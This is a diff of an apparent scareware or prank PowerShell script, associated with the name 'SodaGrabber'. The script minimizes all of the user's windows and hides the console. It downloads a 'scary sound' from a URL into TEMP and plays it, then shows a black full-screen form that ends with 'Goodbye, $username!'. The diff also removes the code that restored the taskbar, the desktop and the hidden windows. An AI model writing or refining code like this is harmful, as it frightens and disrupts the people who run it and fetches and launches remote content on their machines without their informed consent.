@@ -1,8 +1,8 @@
-# Hide all windows instead of killing them
+# Minimize all windows like PowerShell does
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class WindowHider {
+public class WindowMinimizer {
     [DllImport("user32.dll")]
     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     
@@ -20,7 +20,7 @@ public class WindowHider {
     
     public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
     
-    public static void HideAllWindows() {
+    public static void MinimizeAllWindows() {
         EnumWindows(new EnumWindowsProc((hWnd, lParam) => {
             if (IsWindowVisible(hWnd)) {
                 System.Text.StringBuilder sb = new System.Text.StringBuilder(256);
@@ -28,19 +28,9 @@ public class WindowHider {
                 string title = sb.ToString();
                 if (!string.IsNullOrEmpty(title) && 
                     !title.Contains("SodaGrabber") && 
-                    !title.Contains("powershell") && 
-                    !title.Contains("cmd")) {
-                    ShowWindow(hWnd, 0); // SW_HIDE = 0
+                    !title.Contains("powershell")) {
+                    ShowWindow(hWnd, 6); // SW_MINIMIZE = 6
                 }
-            }
-            return true;
-        }), IntPtr.Zero);
-    }
-    
-    public static void RestoreAllWindows() {
-        EnumWindows(new EnumWindowsProc((hWnd, lParam) => {
-            if (IsWindowVisible(hWnd)) {
-                ShowWindow(hWnd, 5); // SW_SHOW = 5
             }
             return true;
         }), IntPtr.Zero);
@@ -48,15 +38,10 @@ public class WindowHider {
 }
 "@ -ReferencedAssemblies "System.Runtime.InteropServices"
 
-# Hide taskbar and desktop
-$taskbar = [WindowHider]::FindWindow("Shell_TrayWnd", $null)
-[WindowHider]::ShowWindow($taskbar, 0)
-$desktop = [WindowHider]::FindWindow("Progman", $null)
-[WindowHider]::ShowWindow($desktop, 0)
+# Minimize everything first
+[WindowMinimizer]::MinimizeAllWindows()
 
-# Hide all other windows
-[WindowHider]::HideAllWindows()
-
+# Hide PowerShell window (minimize it)
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
@@ -64,7 +49,7 @@ public static extern IntPtr GetConsoleWindow();
 public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 '
 $consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
+[Console.Window]::ShowWindow($consolePtr, 6) | Out-Null  # SW_MINIMIZE = 6
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -74,7 +59,7 @@ $soundPath = "$env:TEMP\scary_sound.mp3"
 
 try {
     Invoke-WebRequest -Uri $soundUrl -OutFile $soundPath -ErrorAction Stop
-    Start-Process $soundPath -WindowStyle Hidden
+    Start-Process $soundPath -WindowStyle Minimized
 } catch {}
 
 $form = New-Object System.Windows.Forms.Form
@@ -92,14 +77,6 @@ $form.BackColor = "Black"
 $form.KeyPreview = $true
 $form.Add_KeyDown({
     if ($_.KeyCode -eq "Escape") {
-        # Restore everything
-        $taskbar = [WindowHider]::FindWindow("Shell_TrayWnd", $null)
-        [WindowHider]::ShowWindow($taskbar, 1)
-        $desktop = [WindowHider]::FindWindow("Progman", $null)
-        [WindowHider]::ShowWindow($desktop, 1)
-        [WindowHider]::RestoreAllWindows()
-        
-        Get-Process | Where-Object { $_.Path -like "*scary_sound.mp3" } | Stop-Process -Force
         $form.Close()
         [System.Windows.Forms.Application]::Exit()
     }
@@ -299,13 +276,6 @@ $displayText += " "*30 + "Goodbye, $username!`r`n"
 $label.Text = $displayText
 $form.Refresh()
 Start-Sleep -Seconds 3
-
-# Restore everything
-$taskbar = [WindowHider]::FindWindow("Shell_TrayWnd", $null)
-[WindowHider]::ShowWindow($taskbar, 1)
-$desktop = [WindowHider]::FindWindow("Progman", $null)
-[WindowHider]::ShowWindow($desktop, 1)
-[WindowHider]::RestoreAllWindows()
 
 $form.Close()
 [System.Windows.Forms.Application]::Exit()
